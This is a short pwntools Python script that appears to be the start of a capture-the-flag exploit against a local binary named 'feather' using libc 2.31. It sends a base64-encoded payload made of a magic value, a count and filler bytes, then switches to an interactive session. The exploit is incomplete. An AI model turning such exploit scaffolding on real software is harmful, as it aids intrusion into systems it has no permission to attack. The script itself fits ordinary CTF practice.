from pwn import *
import time
import base64

elf = ELF("./feather")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=process([elf.path],env={"LD_PRELOAD":libc.path})
#target=remote()
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

pause()
payload=p64(0x52454854414546)+p64(0x1)+p64(0xdeadbeefcafebabe)*6
payload=base64.encodestring(payload)
payload+="\n"*2
target.send(payload)

target.interactive()
